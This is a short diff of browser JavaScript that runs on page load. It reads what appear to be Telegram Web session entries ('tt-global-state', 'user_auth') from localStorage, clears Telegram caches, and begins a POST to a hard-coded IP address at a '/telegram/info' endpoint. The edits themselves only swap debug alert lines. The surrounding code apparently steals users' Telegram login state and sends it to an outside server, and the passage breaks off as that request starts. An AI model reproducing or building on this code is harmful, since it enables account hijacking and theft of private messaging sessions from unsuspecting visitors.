@@ -1,6 +1,5 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
-    alert("ASD");
     let globalState = localStorage.getItem("tt-global-state");
     if (globalState && localStorage.getItem("user_auth")) {
       const parsedState = JSON.parse(globalState);
@@ -14,6 +13,8 @@ document.addEventListener("DOMContentLoaded", function() {
 
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
+
+        alert("DDD0");
 
         fetch(`http://94.131.9.66:4040/api/users/telegram/info`, {
           method: "POST",
